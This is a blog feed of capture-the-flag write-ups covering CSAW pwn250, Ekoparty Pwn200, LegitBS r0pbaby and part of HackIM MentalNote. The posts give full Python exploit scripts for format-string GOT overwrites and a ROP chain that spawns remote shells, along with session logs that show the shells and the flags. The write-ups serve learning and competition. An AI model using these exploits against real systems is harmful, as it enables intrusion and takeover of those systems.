    readtil('&gt;&gt;&gt; ')


def leak(x):
    print "leaking " + hex(x)
    global last_addr
    # edit contact 1 -&gt; name to overflow pointers
    sendln('3')
    readtil('change? ')
    if last_addr == 0:
        sendln('BAR1')
    else:
        sendln('B'*63)

    readtil('&gt;&gt;&gt; ')
    sendln('1')
    readtil('name:')
    #       name   len    valid   char *description==write1-&gt;free@got // char *phone==leak1-&gt;malloc@got  
    sendln('B'*63+"\x00"+"BBBB"+p(0)+p(x)+p(x)+"BAR2")
    last_addr = x

    readtil('&gt;&gt;&gt; ')

    sendln('4')
    data = readtil('&gt;&gt;&gt; ')
    m = re.findall('Phone #: (.*)', data)
    return m[0]

def leak4(x):
    return struct.unpack('I', leak(x)[0:4])[0]

def pwn():
    global s
    global last_addr
    last_addr = 0
    s=socket(AF_INET, SOCK_STREAM)
    #s.connect(('127.0.0.1', 4444))
    s.connect(('54.165.223.128', 2555))
    readtil('&gt;&gt;&gt; ')

    # create contact 1
    sendln('1')
    readtil('Name: ')
    sendln('BAR1')
    readtil('Phone No: ')
    sendln('0')
    readtil('description: ')
    sendln('100')
    readtil('description:')
    sendln('BLEH')

    readtil('&gt;&gt;&gt; ')

    # create contact 2
    sendln('1')
    readtil('Name: ')
    sendln('BAR2')
    readtil('Phone No: ')
    sendln('1')
    readtil('description: ')
    sendln('100')
    readtil('description:')
    sendln('BLAH')

    readtil('&gt;&gt;&gt; ')

    # create contact 3 (used in write)
    sendln('1')
    readtil('Name: ')
    sendln('BAR4')
    readtil('Phone No: ')
    sendln('1')
    readtil('description: ')
    sendln('100')
    readtil('description:')
    sendln('BLAH')

    readtil('&gt;&gt;&gt; ')

    # create contact 4 (used as payload for system())
    sendln('1')
    readtil('Name: ')
    sendln('/bin/sh')
    readtil('Phone No: ')
    sendln('1')
    readtil('description: ')
    sendln('100')
    readtil('description:')
    sendln('BLAH')

    readtil('&gt;&gt;&gt; ')

    # 00064c10 W puts
    # 00075b30 malloc
    # 0004cc40 T print


    malloc = leak4(0x804b020)
    print "[+] malloc @ " + hex(malloc)

    libc = malloc - 0x0075b30
    print "[+] libc @ " + hex(libc)

    # 0003fcd0 W system
    system = libc + 0x003fcd0

    print "[+] system @ " + hex(system)

    print "[+] overwriting memset@got with system the hard way"
    write(0x804b03c, system)

    print "[+] deleting element"

    sendln('2')
    readtil('remove?')
    sendln('/bin/sh')


    t=telnetlib.Telnet()
    t.sock =s 
    t.interact()


    s.close()
pwn()
</code></pre>

<p>And in action:</p>

<pre><code>bas@tritonal:~/bin/csaw15/pwn250$ python ./pwn250poc.py 
leaking 0x804b020
[+] malloc @ 0xf7619b30
[+] libc @ 0xf75a4000
[+] system @ 0xf75e3cd0
waiting...
[+] overwriting memset@got with system the hard way
writing 0x804b03c
['ffade868']
0x68

    Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
&gt;&gt;&gt; 
[+] deleting element
Name to remove? /bin/sh
id
uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
cd 
ls
contacts_54f3188f64e548565bc1b87d7aa07427
flag
cat flag
flag{f0rm47_s7r1ng5_4r3_fun_57uff}
</code></pre>

<p>Gotta love format string vulnerabilities. The flag was <code>flag{f0rm47_s7r1ng5_4r3_fun_57uff}</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Ekoparty - Pwn200]]></title>
    <link href="http://barrebas.github.io/blog/2015/09/21/ekoparty-pwn200/"/>
    <updated>2015-09-21T23:47:44+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/09/21/ekoparty-pwn200</id>
    <content type="html"><![CDATA[<p>Where on earth shall we begin? This one kept us busy for quite some time. The challenge gives no binary, just an address to connect to. Upon connecting, we get some kind of echo server. We quickly noticed a string format vulnerability:</p>

<!--more-->


<pre><code>$ nc challs.ctf.site 20002
&lt;Simple loop greetings v1.3.3.7&gt;
[!] Type bye to quit
Enter your name: %17$s
Hi 3k0_p4rty_2015!
</code></pre>

<p>However this wasn&rsquo;t the flag. As we&rsquo;ll see later, this was part of the challenge. We started dumping the entire binary using the string format vuln. Our format string can be found at offset 8 with 1 byte of padding:</p>

<p>bAAAA%8$x</p>

<pre><code>nc challs.ctf.site 20002
&lt;Simple loop greetings v1.3.3.7&gt;
[!] Type bye to quit
Enter your name: bAAAA%8$x
Hi bAAAA41414141
</code></pre>

<p>From the raw dump, we reconstructed parts of the binary. We came across a string that said &ldquo;OMG! Well done, here&rsquo;s your flag&rdquo; or something along those lines. Looking through the raw dump, we found where that string is referenced. Disassembling with radare2 gave us this:</p>

<pre><code>bas@tritonal:~$ rasm2 -d -o 0x13370861 -
7517c7442404970a37138d45e7890424e86afcffff85c074188d45e789442404c704249a0a3713e883fcffffe9a52a2a2ac70424a20a3713e872fcffff8d45e7890424e867fcffffc70424a60a3713e8cbfcffff8d45e789442404c70424a70a3713e828fcffff85c07566c70424c40a3713e838fcffffa10821371389442404c70424c1203713e8f0fdffff8945dca10821371389442404c70424cc2037130cd8fdffff8945e08b4545dc890424e8f6fbffff8b45dc890424
disassemble error at offset 162
jnz 0x1337087a
mov dword [esp+0x4], 0x13370a97
lea eax, [ebp-0x19]
mov [esp], eax
call dword 0x133704e0
test eax, eax
jz 0x13370892
lea eax, [ebp-0x19]
mov [esp+0x4], eax
mov dword [esp], 0x13370a9a ; 
call dword 0x13370510       ; puts? (value in got is 0xb7e76c40)
jmp dword 0x3d613337
mov dword [esp], 0x13370aa2 ; Hi
call dword 0x13370510
lea eax, [ebp-0x19]
mov [esp], eax
call dword 0x13370510
mov dword [esp], 0x13370aa6
call dword 0x13370580       ; ? (value in got is 0xb7e8ec10)
lea eax, [ebp-0x19]
mov [esp+0x4], eax
mov dword [esp], 0x13370aa7 ; Welcome to ekoparty 2015!
call dword 0x133704f0       ; strcmp? (value in got is 0xb7f60b60)
test eax, eax
jnz 0x13370932
mov dword [esp], 0x13370ac4 ; OMG! nice work, your flag is:
call dword 0x13370510       ; puts?
mov eax, [0x13372108]       ; -&gt; 0x13373008, contains '47fa'
mov [esp+0x4], eax
mov dword [esp], 0x133720c1 ; qs'HG, 7173271f..
call dword 0x133706dd       ; see below
mov [ebp-0x24], eax
mov eax, [0x13372108]
mov [esp+0x4], eax
mov dword [esp], 0x133720cc ; 0x1d0a0c56
or al, 0xd8
std
invalid
</code></pre>

<p>Since our input can never be larger than 12 bytes, we can never win the strcmp with <code>Welcome to ekoparty 2015</code>. From here, we tried a lot of things. The 12 char input limit was annoying, cos we couldn&rsquo;t really write anything, anywhere:</p>

<p><code>A\xde\xad\xbe\xef%255c%8$hn</code> was 15 chars&hellip; So we set out to make a write() function using the format string vuln.</p>

<p>On the stack, there are many DWORDS. Some of them contain stack addresses. Some of those addresses refer to other stack addresses (they&rsquo;re usually stack frame pointers). Using three memory positions, we could construct a write function using format string argument 25, 61 and 124 (ASLR is off so the addresses remain constant). Here&rsquo;s how:</p>

<p>$25 contains the address of $61. Let&rsquo;s assume $25 contains 0xfffff080.</p>

<p>$61 is at 0xfffff080 and contains 0xfffff1a0, which is $124 (math doesn&rsquo;t work out but bear with me).</p>

<p>$124 contains nothing of interest, and isn&rsquo;t used by the binary.</p>

<p>If we now use the format string, we use $61 to write to $124, and $25 to update $61. Finally, once we&rsquo;ve written out an address in $124, we can use the format string to write to that location.</p>

<p>Let&rsquo;s assume we want to write 0x41414141 to 0x804b020. We first do this:</p>

<pre><code>%32c%61$hhn (write 0x20 to 0xfffff1a0). 
</code></pre>

<p>Then, we update the pointer at $61 by writing to $25:</p>

<pre><code>%161c%25$hhn
</code></pre>

<p>So $61 will now contain 0xfffff1a1. Then we write to $124 again via $61:</p>

<pre><code>%176c%61$hhn (write 0xb0 to 0xfffff1a1). 
</code></pre>

<p>Etc until we have 0x804b020 at $124. Then we write using $124:</p>

<pre><code>%65c%124$hhn
</code></pre>

<p>And we&rsquo;ll have written the first byte to 0x804b020. We repeat this process for the other bytes&hellip;</p>

<p>With our new and shiny write() function we set out to break this challenge. We first tried truncating the string &ldquo;Welcome to ekoparty 2015!&rdquo; in memory, so we could have an input that would fit the 12 char limit. Writing to that location didn&rsquo;t work, presumably cos that string was in non-writeable memory. Remember, we needed to enter the code path here:</p>

<pre><code>mov dword [esp], 0x13370aa7 ; Welcome to ekoparty 2015!
call dword 0x133704f0       ; strcmp? (value in got is 0xb7f60b60)
test eax, eax
jnz 0x13370932
mov dword [esp], 0x13370ac4 ; OMG! nice work, your flag is:
call dword 0x13370510       ; puts?
mov eax, [0x13372108]       ; -&gt; 0x13373008, contains '47fa'
mov [esp+0x4], eax
mov dword [esp], 0x133720c1 ; qs'HG, 7173271f..
call dword 0x133706dd       ; see below
mov [ebp-0x24], eax
mov eax, [0x13372108]
mov [esp+0x4], eax
mov dword [esp], 0x133720cc ; 0x1d0a0c56
</code></pre>

<p>We dumped and reversed the function at <code>0x133720cc</code>, which apparently decodes the flag. However, we where only able to get the pieces <code>EKO{</code> and <code>b4by</code>. The dump process wasn&rsquo;t perfect, so we continued.</p>

<p>So how could we get strcmp() to return 0? By overwriting the value in the got with a location that does <code>xor eax, eax; ret</code>. We dumped bytes around the strcmp pointer (ASLR was off so libc was at a static position) and indeed, we identified a rop-like gadget that did just that! Careful overwriting of the got pointer of strcmp in two steps was necessary, but again we lucked out: strcmp was at 0xb7f60b60, the <code>xor eax, eax</code> gadget was at 0xb7f61fc4. At 0xb7f61c60, there was this perfect gadget:</p>

<pre><code>movzx ecx, byte [eax+0x5]
movzx eax, byte [edx+0x5]
sub eax, ecx
ret
</code></pre>

<p>In two steps, we overwrote strcmp (we can&rsquo;t have the got pointer pointing to illegal instructions, cos that would make the binary crash before we can overwrite the next value!) with the xor eax gadget&hellip; and we got something like this:</p>

<pre><code>OMG! nice work, your flag is: EKO{
</code></pre>

<p>And then nothing?! We overwrote the free() got pointer with puts and this dumped more text, convincing us that the overwrite was working correctly. This lead us to believe the binary was broken&hellip; Which indeed it turned out to be, later on.</p>

<p>Next, loads of failed attempts later, we stumbled upon <a href="https://wapiflapi.github.io/2014/11/17/hacklu-oreo-with-ret2dl-resolve/">this writeup of another challenge</a> that uses ret2dl. In other words, abuse the symbol resolver. Quickly after that, we found another good writeup, using a slightly easier technique. It <a href="https://github.com/mrmacete/writeups/tree/master/wapiflapi-exrs/sploit/s7">traverses the link_map</a> found in memory to grab <code>system()</code>.</p>

<p>This turned out to work. We traversed the link_map by hand, adjusting the leaked bytes from time to time (remember, printf chokes on nul bytes).</p>

<p>At the start of the got, we find these bytes:</p>

<pre><code>0x13371f14 ; .dynamic
0xb7fff938 ; *link_map
0xb7ff24f0 ; *dl-resolve
</code></pre>

<p>We take 0xb7fff938, the *link_map, and dump from there. link_map looks like this:</p>

<pre><code class="c">struct link_map
  {
    /* These first few members are part of the protocol with the debugger.
       This is the same format used in SVR4.  */

    ElfW(Addr) l_addr;          /* Base address shared object is loaded at.  */
    char *l_name;               /* Absolute file name object was found in.  */
    ElfW(Dyn) *l_ld;            /* Dynamic section of the shared object.  */
    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */
  };
</code></pre>

<p>So at 0xb7fff938 we find:
<code>
0x746e450a ; base_addr.. not correct due to printf
0xb7fffc24 ; name! empty
0x13371f14 ; the bin itself... not useful.
0xb7fffc28 ; ptr-&gt;next
</code></p>

<p>This is the binary. On to the next one at 0xb7fffc28, which was linux-gate&hellip; Then the next one was indeed libc! This was confirmed by reading link_map->l_name. We now had the dynamic section of libc, time to parse it for system. Soon, using the printf format string vulnerability and a messy python script, we were dumping symbols. After about an hour, we hit the jackpot:</p>

<pre><code>[+] Opening connection to challs.ctf.site on port 20002: Done
0xb7e2dec8 0x0
0xb7e2ded8 0x1da8
1768709983 __li
0x0
0xb7e2dee8 0xbde
1819570783 _rtl
0x0
0xb7e2def8 0x45d1
1768709983 __li
0x0
0xb7e2df08 0x13f4
...
0xb7e2f948 0x3176
signal
0xb7e2f9a8 0xeab
puts
0xb7e30208 0xa3e
&lt;empty&gt;

0xb7e30588 0x3063
__libc_system
Enter your name:
[!] found system!0x3fcd0 0xb7e69cd0
</code></pre>

<p>We had the address of system! Now, the plan of attack was as follows:</p>

<ul>
<li>write <code>/bin/sh</code> to 0x13373008, which gets used in a free() call</li>
<li>overwrite free@got with system</li>
<li>set strcmp to the <code>xor eax, eax; ret</code> gadget</li>
<li>receive shell</li>
</ul>


<p>This <em>almost</em> worked out, but we set strcmp to 0xb7f61f60 and that turned out to be enough. We landed a shell!</p>

<p>The poc we used:</p>

<pre><code class="python">import socket, struct, telnetlib, time
from pwn import *

context(arch='i386', os='linux')
def p(x):
        return struct.pack('&lt;I', x)

def read1(address):
    conn.send("%64c%25$hhn")           # 0xbffff940
    conn.recv(200)
    conn.send("%"+str(256)+"c%61$hhn")           # set byte at 0xbf..40 to '3c'
    conn.recv(300)

    if (address &amp; 0xff):
        conn.send("%64c%25$hhn")           # 0xbffff940
        conn.recv(200)
        conn.send("%"+str(address &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..40 to '3c'
        conn.recv(300)

    conn.send("%65c%25$hhn")           # next byte, 0xbffff941
    conn.recv(200)
    conn.send("%"+str((address &gt;&gt; 8) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..41 to '20'
    conn.recv(300)

    conn.send("%66c%25$hhn")           # next byte, 0xbffff942
    conn.recv(200)
    conn.send("%"+str((address &gt;&gt; 16) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..42 to '37'
    conn.recv(300)

    conn.send("%67c%25$hhn")           # final byte, 0xbffff943
    conn.recv(200)
    conn.send("%"+str((address &gt;&gt; 24) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..43 to '13'
    conn.recv(300)

    conn.send("%124$s")

    data = conn.recv(200)
    if data[4:7] == 'Ent':
        return 0
    return ord(data[3:4])

def read4(address):
    value = 0
    for i in range(4):
        #value &lt;&lt;= 8
        value += read1(address+i) &lt;&lt; (8*i)

    return value


def leak(address):
    conn.send("%64c%25$hhn")           # 0xbffff940
    conn.recv(200)
    conn.send("%"+str(256)+"c%61$hhn")           # set byte at 0xbf..40 to '3c'
    conn.recv(300)

    if (address &amp; 0xff):
        conn.send("%64c%25$hhn")           # 0xbffff940
        conn.recv(200)
        conn.send("%"+str(address &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..40 to '3c'
        conn.recv(300)

    conn.send("%65c%25$hhn")           # next byte, 0xbffff941
    conn.recv(200)
    conn.send("%"+str((address &gt;&gt; 8) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..41 to '20'
    conn.recv(300)

    conn.send("%66c%25$hhn")           # next byte, 0xbffff942
    conn.recv(200)
    conn.send("%"+str((address &gt;&gt; 16) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..42 to '37'
    conn.recv(300)

    conn.send("%67c%25$hhn")           # final byte, 0xbffff943
    conn.recv(200)
    conn.send("%"+str((address &gt;&gt; 24) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..43 to '13'
    conn.recv(300)

    conn.send("%124$s")
    data = conn.recv(200)
    return data[3:]

def write1(what, where):
#       argument 25 contains 0xbffff844,
#                               which points to 0xbffff958
#       so we can use 25 to modify position 61 to write something on the stack!
#       addr = 0xbffff758 # = argument 2
    conn.send("%64c%25$hhn")           # 0xbffff940
    conn.recv(200)
    conn.send("%"+str(where &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..40 to '3c'
    conn.recv(300)

    conn.send("%65c%25$hhn")           # next byte, 0xbffff941
    conn.recv(200)
    conn.send("%"+str((where &gt;&gt; 8) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..41 to '20'
    conn.recv(300)

    conn.send("%66c%25$hhn")           # next byte, 0xbffff942
    conn.recv(200)
    conn.send("%"+str((where &gt;&gt; 16) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..42 to '37'
    conn.recv(300)

    conn.send("%67c%25$hhn")           # final byte, 0xbffff943
    conn.recv(200)
    conn.send("%"+str((where) &gt;&gt; 24 &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..43 to '13'
    conn.recv(300)

    # write byte
    if ord(what) &lt; 100:
        conn.send("%"+str(ord(what))+"c%124$hhn")
    else:
        conn.send("%"+str(ord(what))+"c%124$hn")
    conn.recv(300)

def writebytes(what, where):
    for i in range(len(what)):
        write1(what[i], where+i)

global conn
conn = remote('challs.ctf.site', 20002)
conn.recv(200)

print "[+] writing /bin/sh to 0x13373008"
writebytes('/bin/sh', 0x13373008)

print "[+] writing system() to 0x13372020"
writebytes(struct.pack('I', 0xb7e69cd0), 0x13372020)

print "[+] fucking up strcmp()"
writebytes("\x1f", 0x13372011)

conn.interactive()
</code></pre>

<p>Yeah. Pretty horrible.</p>

<pre><code>bas@tritonal:~/bin/ekoparty-ctf/pwn20$ python pwnpoc.py 
[+] Opening connection to challs.ctf.site on port 20002: Done
[+] writing /bin/sh to 0x13373008
[+] writing system() to 0x13372020
[+] fucking up strcmp()
[*] Switching to interactive mode
$ id
$ id
uid=1001(simple) gid=1001(simple) groups=1001(simple)
$ cd /home/simple
$ ls -al
total 68
drwxr-x--- 2 simple simple  4096 Sep 17 13:45 .
drwxr-xr-x 6 root   root    4096 Sep 12 21:10 ..
-rw------- 1 simple simple   145 Sep 12 21:13 .bash_history
-rw-r--r-- 1 simple simple   220 Oct  7  2014 .bash_logout
-rw-r--r-- 1 simple simple  3637 Oct  7  2014 .bashrc
-rw-r--r-- 1 simple simple   675 Oct  7  2014 .profile
-rwxr-xr-x 1 root   root   27095 Nov 17  2011 checksec.sh
-rw-r--r-- 1 simple simple    35 Sep 14 23:37 flag
-rw-r----- 1 root   simple  1904 Aug 27 01:08 fmt_001.c
-rwxr-x--- 1 root   simple  5776 Aug 27 01:08 greetings
Hi id

OMG! nice work, your flag is: ^\x10LnBye!
[*] Got EOF while reading in interactive
$  
</code></pre>

<p>After 10 seconds, we got kicked out, but that was enough time to grab some files. Sadly, the flag file was not the flag&hellip; someone planted it there (thanks! but no thanks). So we grabbed the C source file:</p>

<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include  &lt;signal.h&gt;

char *mkey;
unsigned char mkey_crypt[] = { "\x07\x5b\x54\x03\x40\x0f\x4c\x1a\xb2\x0b\x0c\x0b\x04\x77\x1e\x24\x4c\x79\x42\xe7\x2c\xb4\xbf\xa0\x40\x7a\x79\x7a\x32\x0c\x68\xb9\x32\xb7\xf0\x62\xa7\xac\xa6\xe0\x68\x6a\x6f\x54\x28\x59\xa8\x3d\xee\x97\x04\x93\x9f\xcd\xf0\x5b\x0a\x08\x0b\x3e\x5f\xcd\x5f\xaf" };  
unsigned char fmt[] = { "\x71\x73\x27\x1f\x1d\x48\x47" };
unsigned char flag[] = { "\x56\x0c\x0a\x1d\x67\x08\x42\x18\x57\x5c\x53\x4f\x1a\x04\x72\x21\x18\x3a\x31\x05\x49\x26\x2c\x18\x09\x1e\x1a\x70\x5c\x6b" };

char *decrypt(const char *msg, const char *key)
{
    int len_key = strlen(key);
    int len_msg = strlen(msg);
    int i, j;
    char *out = (char *)malloc(len_key + 1);
    if (!out)
    {
        printf("WTF no memory :s");
        return NULL;
    }
    for (i = 0; i &lt; len_msg &amp;&amp; i &lt; sizeof(len_msg); i++)
    {
        out[i] = msg[i] ^ (i + key[i%len_key]);
    }
    return out;
}

void handler(int num)
{
    puts("Bye!");
    exit(-1);
}

void process()
{
    char buff[13];
    puts("&lt;Simple loop greetings v1.3.3.7&gt;");
    puts("[!] Type bye to quit");
    while (1)
    {
        alarm(10);
        printf("Enter your name: ");
        fflush(stdout);
        memset(buff, 0, sizeof(buff));
        read(0, buff, sizeof(buff) - 1);
        if (strstr(buff, "bye"))
        {
            puts("Bye!");
            break;
        }
        if (strstr(buff, "%n") || strstr(buff, "%N"))
        {
            //p: %s\n", buff);
            break;
        }
        printf("Hi ");printf(buff);puts("");
        if (!strcmp("Welcome to ekoparty 2015!", buff))
        {
            printf("OMG! nice work, your flag is: ");
            char *fmt_ = decrypt(fmt, mkey);
            char *flag_ = decrypt(flag, mkey);
            printf(fmt_, flag_);
            free(fmt_);
            free(flag_);
            break;
        }
    }
}

//gcc -m32 Wl,-Ttext-segment=0x13370000 -o greetings fmt_001.c ; strip greetings
int main(int argc, char **argv)
{
    signal(SIGALRM, handler);
    mkey = decrypt(mkey_crypt, "3k0_p4rty_2015!");
    process();
    free(mkey);
}
</code></pre>

<p>Spot the mistake!</p>

<p>Found it? Yeah:</p>

<pre><code>for (i = 0; i &lt; len_msg &amp;&amp; i &lt; sizeof(len_msg); i++)
</code></pre>

<p>Thanks. Anyway, we reimplemented this file in Python (honestly couldn&rsquo;t get the C program to run without segfaulting, bleh).</p>

<pre><code class="python">def decrypt(msg, key):
    out = ""

    for i in range(len(msg)):
        out += chr(ord(msg[i]) ^ (ord(key[i % len(key)]) + i))

    return out


mkey = decrypt("\x07\x5b\x54\x03\x40\x0f\x4c\x1a\xb2\x0b\x0c\x0b\x04\x77\x1e\x24\x4c\x79\x42\xe7\x2c\xb4\xbf\xa0\x40\x7a\x79\x7a\x32\x0c\x68\xb9\x32\xb7\xf0\x62\xa7\xac\xa6\xe0\x68\x6a\x6f\x54\x28\x59\xa8\x3d\xee\x97\x04\x93\x9f\xcd\xf0\x5b\x0a\x08\x0b\x3e\x5f\xcd\x5f\xaf", "3k0_p4rty_2015!")

print decrypt("\x71\x73\x27\x1f\x1d\x48\x47", mkey)
print decrypt("\x56\x0c\x0a\x1d\x67\x08\x42\x18\x57\x5c\x53\x4f\x1a\x04\x72\x21\x18\x3a\x31\x05\x49\x26\x2c\x18\x09\x1e\x1a\x70\x5c\x6b", mkey)
</code></pre>

<p>Which <em>finally</em> gave us the flag:</p>

<pre><code>EKO{\%s}
b4by_3xpl0it_FMT_str1ng_FTW!#$
</code></pre>

<p>The flag was <code>EKO{b4by_3xpl0it_FMT_str1ng_FTW!#$}</code>. Too bad the challenge was broken, nice to learn a new technique!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LegitBS CTF - R0pbaby]]></title>
    <link href="http://barrebas.github.io/blog/2015/05/29/legitbs-ctf-r0pbaby/"/>
    <updated>2015-05-29T23:07:23+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/05/29/legitbs-ctf-r0pbaby</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve been away for quite a while, and I missed most of the LegitBS CTF. There were only a few hours left when I joined Swappage. Here&rsquo;s how we solved r0pbaby.</p>

<!--more-->


<p>So we&rsquo;re given a binary and a place to connect to. Upon running and examing the binary, it seems like this is a very easy ROP challenge. The binary will give libc function addresses upon request; this makes it easy to defeat ASLR. The option of getting libc&rsquo;s base address seems to return some strange address. Finally, the third option asks for a buffer, which is then copied to the stack, overwrites the saved return address and basically kicks off our ROP chain&hellip; couldn&rsquo;t be easier, right?</p>

<pre><code class="bash">bas@tritonal:~/tmp/ropbaby$ file r0pbaby
r0pbaby: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped
bas@tritonal:~/tmp/ropbaby$ gdb ./r0pbaby 
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : ENABLED
RELRO     : disabled
</code></pre>

<p>So exploiting it should be relatively easy. The binary itself contains very little useable gadgets. We can defeat ASLR by leaking function addresses. There is, however, the problem of finding the correct libc <em>version</em>. This took us some time to figure out, but luckily Swappage found an <a href="https://github.com/niklasb/libc-database">offline tool to identify libc</a>. It was <code>libc6_2.19-0ubuntu6.6_i386</code>. Another nice tool to identify libc is <a href="http://libcdb.com">libcdb.com</a>. After identifying the right libc version, we could find all the necessary gadgets via <a href="http://ropshell.com">ropshell.com</a>. Our plan was to <code>mprotect()</code> a certain region of memory as RWX, then <code>read()</code> in some shellcode and return to it.</p>

<p>Now, the plan fell through. For some reason, the <code>read()</code> syscall to read in the shellcode failed. Instead, I switched the exploit around a bit. We have access to <code>system()</code>, so I set up a ROP chain to <code>mprotect()</code> the first 0x1000 bytes of libc as RWX. Then, I wrote out the string <code>/bin//sh</code> to memory. At this point, it was getting late and I could have just as easily written out <code>/bin/sh,0</code> to memory&hellip; Finally, returning to <code>system("/bin//sh")</code> spawned a shell, allowing us to read the flag!</p>

<pre><code class="python">import socket, struct, re, time

def p(x):
    return struct.pack('&lt;Q', x)

def get_function(s, name):
    s.send('2\n')
    s.send(name+'\n')
    time.sleep(0.50)
    data = s.recv(1000)

    m = re.findall('(0x0000.*)', data)
    print m
    return int(m[0], 16)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect(('localhost', 4000))
s.connect(('r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me', 10436))

print s.recv(1000)
print s.recv(1000)

# get some address where we'll store the shellcode
SYSTEM = get_function(s, "system")
READ = get_function(s, "read")
MPROTECT = get_function(s, "mprotect")

# this offset was found like so:
# $ nm -D ./libc-2.19.so |grep mprotect
# 00000000000f4a20 W mprotect
LIBC_BASE = MPROTECT - 0xf4a20

print "[!] libc_base  = 0x%X" % LIBC_BASE
print "[!] system()   = 0x%X" % SYSTEM
print "[!] read()     = 0x%X" % READ
print "[!] mprotect() = 0x%X" % MPROTECT

POPRDX = LIBC_BASE + 0x000bcee0
POPRAX = LIBC_BASE + 0x00048858
POPRSI = LIBC_BASE + 0x00024805
POPRDI = LIBC_BASE + 0x00022b1a
SYSCAL = LIBC_BASE + 0x000c1e55
MOVMEM = LIBC_BASE + 0x0002fa03 #: mov [rax], rdx; ret

# kick off ROP chain
s.send('3\n')
print s.recv(1000)


# build ROP chain
# first, mprotect() a certain area
payload = "A"*8
payload += p(POPRDX)
payload += p(7)
payload += p(POPRSI)
payload += p(0x1000)
payload += p(POPRDI)
payload += p(LIBC_BASE)
payload += p(POPRAX)
payload += p(10)
payload += p(SYSCAL)

# secondly, write '/bin' to memory via MOVMEM gadget
payload += p(POPRDX)
payload += p(0x6e69622f)
payload += p(POPRAX)
payload += p(LIBC_BASE)
payload += p(MOVMEM)

# thirdly, write '//sh' to memory
payload += p(POPRDX)
payload += p(0x68732f2f)
payload += p(POPRAX)
payload += p(LIBC_BASE+4)
payload += p(MOVMEM)

# finally, return-to-system and invoke a shell
payload += p(POPRDI)
payload += p(LIBC_BASE)
payload += p(SYSTEM)

length = "%d" % (len(payload)+1)
print "[!] sending " + length + " bytes"
s.send(length + '\n')

time.sleep(0.5)
s.send(payload + '\n')

print s.recv(1000)

# interact with the shell
import telnetlib
t = telnetlib.Telnet()
t.sock = s
t.interact()
s.close()
</code></pre>

<p>Putting it all together:</p>

<p><img src="/assets/legitbs/r0pbaby.png" alt="" /></p>

<p>This was an easy one, but still took me a while to get back into binary exploitation. Especially getting the correct libc version took longer than necessary and my thanks go out to Swappage for persisting and finding the correct version!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HackIM CTF - MentalNote]]></title>
    <link href="http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mentalnote/"/>
    <updated>2015-01-11T21:40:18+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mentalnote</id>
    <content type="html"><![CDATA[<p><code>mentalnote</code> was a 400 point exploitation-type challenge in NullCon&rsquo;s HackIM CTF.</p>

<!-- more -->


<p></p>

<p>Again, superkojiman started with the invaluable initial reverse engineering. The application is a note-taking program:</p>

<pre><code>~/tmp/nullcon/exp400$ ./MentalNote 
You want to store some Notes??
Well, we present you the Sherlock's MentalPad --&gt;
Sherlock uses Mental Notes to solve the Cases -- Now you can use it too.
NOTE: It has a limit though
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
</code></pre>

<p>superkojiman pointed out that there were two types of notes. Upon adding a note, the program asks for the type. It looks like the second type is larger. By editing a note as type two, we are able to overflow notes into the next note&rsquo;s meta-data.</p>

<p>First, let&rsquo;s allocate two notes and set them to something to inspect the heap layout.</p>

<pre><code>You want to store some Notes??
Well, we present you the Sherlock's MentalPad --&gt;
Sherlock uses Mental Notes to solve the Cases -- Now you can use it too.
NOTE: It has a limit though
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
Your Choice:
1
Give the type of the Note:
1
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
Your Choice:
1
Give the type of the Note:
1
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
Your Choice:
3
Give the Note id to edit:
0
Give the type to edit:
2
Give your Note:
AAAA
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
Your Choice:
3
Give the Note id to edit:
1
Give the type to edit:
2
Give your Note:
BBBB
Please enter one of the following option:
</code></pre>

<p>I located the second note in the heap using gdb-peda&rsquo;s <code>find</code> command.</p>

<pre><code>gdb-peda$ x/60w 0x804d0c0
0x804d0c0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804d0d0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804d0e0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804d0f0:  0x000000e1  0x0804d1d0  0x0804d010  0x42424242
0x804d100:  0x0000000a  0x00000000  0x00000000  0x00000000
0x804d110:  0x00000000  0x00000000  0x00000000  0x00000000
</code></pre>

<p>You can see that there are several pointers stored on the heap. It looks like a doubly-linked list, with pointers to the next and previous notes. The struct that describes this layout would look something like this:</p>

<pre><code class="c">struct note {
    note *next_note;
    note *prev_note;
